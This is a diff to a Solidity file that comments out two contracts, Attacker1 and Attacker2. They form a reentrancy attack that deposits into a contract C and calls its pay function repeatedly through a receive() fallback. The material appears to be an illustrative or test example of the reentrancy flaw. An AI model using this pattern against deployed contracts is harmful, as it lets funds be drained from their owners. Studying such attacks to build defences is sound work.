@@ -19,27 +19,27 @@ contract C {
 }
 
 
-contract Attacker1 {
+// contract Attacker1 {
 
-    C c;
-    Attacker2 att2;
-    uint counter = 10;
+//     C c;
+//     Attacker2 att2;
+//     uint counter = 10;
 
-    function attack() public {
-        c.deposit(100);
-        c.reenter();
-    }
+//     function attack() public {
+//         c.deposit{value: 100}();
+//         reenter();
+//     }
 
-    function reenter() public {
-        if (counter-- > 0)
-            c.pay(address(att2));
-    }
-}
+//     function reenter() public {
+//         if (counter-- > 0)
+//             c.pay(address(att2));
+//     }
+// }
 
-contract Attacker2 {
-    Attacker1 att1;
+// contract Attacker2 {
+//     Attacker1 att1;
 
-    receive() external payable {
-        att1.reenter();
-    }    
-}
+//     receive() external payable {
+//         att1.reenter();
+//     }    
+// }
